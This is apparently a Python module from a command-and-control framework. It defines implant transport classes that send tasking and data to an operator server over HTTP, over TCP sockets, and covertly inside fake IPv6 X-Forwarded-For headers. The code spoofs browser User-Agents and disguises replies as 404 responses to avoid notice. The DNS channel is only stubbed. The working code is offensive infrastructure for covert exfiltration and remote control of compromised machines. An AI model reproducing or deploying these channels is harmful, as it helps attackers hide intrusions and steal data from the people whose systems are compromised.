from dataclasses import dataclass
from abc import ABC
from sqlite3 import Timestamp
from uuid import uuid4
import requests
import socket


from helpers import debug, fake_ipv6, unfake_ipv6, unwrap_dict, verbose, wrap_dict

@dataclass
class Payload:
    payload:bytes = b''

    def to_json(self):
        ...
    def to_dict(self):
        ...
    def to_raw(self):
        return self.payload


@dataclass
class C2Task:
    timestamp:int
    cmd:str
    callback_freq:float
    jobid:str

    def __str__(self):
        return f'{self.__dict__}'

@dataclass
class C2Response:
    payload:str=''
    implant_id:str=''

    def __str__(self):
        return f'{self.__dict__}'



@dataclass
class Beacon(ABC):
    def beacon(self, payload):
        ...



class HTTPBeacon(Beacon):
    server: str
    endpoint: str

    def beacon(self, payload: bytes):
        verbose(f"beaconing via dns to {self.server}{self.endpoint}")


class DNSBeacon(Beacon):
    server: str

    def beacon(self, payload: bytes):
        verbose(f"beaconing via dns to {self.server}")


@dataclass
class Transport(ABC):
    """C2 transport base class"""

    def send(self, payload: bytes):
        ...

    def recv(self, payload: bytes):
        ...


@dataclass
class HTTPTransport(Transport):
    """Class for http/s based c2 channel
    Meant for burnable short-haul comms or bandwidth-heavy activity
    """

    server: str
    proxies: tuple = tuple()
    endpoint: str = "/"
    send_method: str = "post"
    recv_method: str = "get"
    good_status_code = "200"
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"

    # Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # https://www.whatismybrowser.com/guides/the-latest-user-agent/

    def send(self, data: bytes, **kwargs):
        """This is how we send data via the transport: HTTP """
        verbose(f"sending {data} via http transport on {self.server}{self.endpoint}")
        headers = {"User-Agent": self.user_agent}

        package = {"payload": data, "implant_id": kwargs.get('implant_id',''), 'jobid':kwargs.get('jobid','')}
        payload = wrap_dict(package)
        
        return requests.post(
            self.server,
            headers=headers,
            proxies=kwargs.get("proxies", []),
            data=payload,
        )

    def recv(self) -> dict:
        verbose(f"recieving via http transport on {self.server}{self.endpoint}")
        headers = {"User-Agent": self.user_agent}
        try:
            resp = requests.get(self.server, headers=headers)

            debug(f'got wrapped "{resp.text}"')
            data = unwrap_dict(resp.text)
            verbose("unwrapped", data)

            return data
        except requests.exceptions.ConnectionError as e:
            verbose(e)
        except BaseException as e:
            debug(e)


@dataclass
class HTTPHeaderTransport(Transport):
    """Class for http/s based c2 channel using fake IPv6 X-Forward-For headers
    More useful for beacons maybe? large headers would be suspect...

    Try to keep the whole payload/response under 4K because it will be doubled via the hexlification. 
    https://www.tutorialspoint.com/What-is-the-maximum-size-of-HTTP-header-values
    """

    server: str
    proxies: tuple = tuple()
    endpoint: str = "/"
    send_method: str = "get"
    recv_method: str = "get"
    good_status_code:str = "404"
    header_name:str = 'X-Forwarded-For'
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"

    # Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # https://www.whatismybrowser.com/guides/the-latest-user-agent/

    def send(self, data: str, **kwargs):
        """This is how we send data via the transport: HTTP-Header """
        verbose(f"sending {data} via http header {self.header_name} transport on {self.server}{self.endpoint}")
        # print(data, type(data), dir(data))

        package = {"payload": data, "implant_id": kwargs.get('implant_id','')}
        payload = wrap_dict(package)

        headers = {
            "User-Agent": self.user_agent,
            self.header_name: fake_ipv6(payload)
        }


        # return requests.post(
        #     self.server,
        #     headers=headers,
        #     proxies=kwargs.get("proxies", []),
        #     data=request_payload,
        # )
        try:
            return requests.get(self.server, headers=headers, proxies=kwargs.get("proxies", []),)
        except IndexError as e:
            debug(e)

    def recv(self) -> dict:
        """this is how the implant gets info from the server"""
        verbose(f"recieving via http header {self.header_name} transport on {self.server}{self.endpoint}")
        headers = {"User-Agent": self.user_agent}
        try:
            resp = requests.get(self.server, headers=headers)

            debug(f'got wrapped via headers {self.header_name}: "{resp.headers.get(self.header_name)}"')
            
            addy_list = resp.headers.get(self.header_name, '')
            wrapped_dict = unfake_ipv6(addy_list)
            
            data = unwrap_dict(wrapped_dict)
            verbose("unwrapped", data)

            return data
        except requests.exceptions.ConnectionError as e:
            verbose(e)
        # except BaseException as e:
        #     debug(e)

@dataclass
class DNSTransport(Transport):
    """Class for dns based c2 channel"""

    domain: str
    tx_record_type: str = "A"
    rx_record_type: str = "A"

    def send(self, data: bytes, **kwargs):
        """This is how we send data via the transport: DNS """
        verbose(
            f"sending {data} via DNS {self.tx_record_type} record on {self.domain}"
        )
        raise NotImplemented

    def recv(self) -> dict:
        verbose(f"recieving via DNS {self.tx_record_type} record on {self.domain}")
        raise NotImplemented



class TCPTransport(Transport):
    """Class for TCP based c2 channel; I think of this as mostly an egress transport..."""
    server:str


    
    def __init__(self, server:str):
        t = server.split(':')
        self.host = t[0] 
        self.port = int(t[1])
        
        # self.sock.settimeout(30.0)

        

    def send(self, data: bytes, **kwargs):
        """This is how we send data via the transport: TCP """
        verbose(
            f"sending {data} via TCP {self.host} port {self.port}"
        )

        package = {"payload": data, "implant_id": kwargs.get('implant_id','')}
        payload = wrap_dict(package)
        
        try:
            sock = socket.socket()
            sock.connect((self.host, self.port))             
            sock.send(payload.encode())
            sock.close()
        except BaseException as e:
            print(e)
        # raise NotImplemented

    def recv(self) -> dict:
        # It doesn't make sense to recv data via tcp by randomly selecting the transport channels... 
        verbose(
            f"recieving via TCP {self.host} port {self.port}"
        )

        # try:
        #     # get the package
        #     wrapped_dict = self.sock.recv(1024)
        #     # unwrap it
        #     data = unwrap_dict(wrapped_dict)
        #     # hand it to implant
        #     return data

        # except socket.timeout as e:
        #     verbose("socket timed out... do we reconnect?", e)     
        # except BaseException as e:
        #     verbose(e)   

        raise NotImplementedError
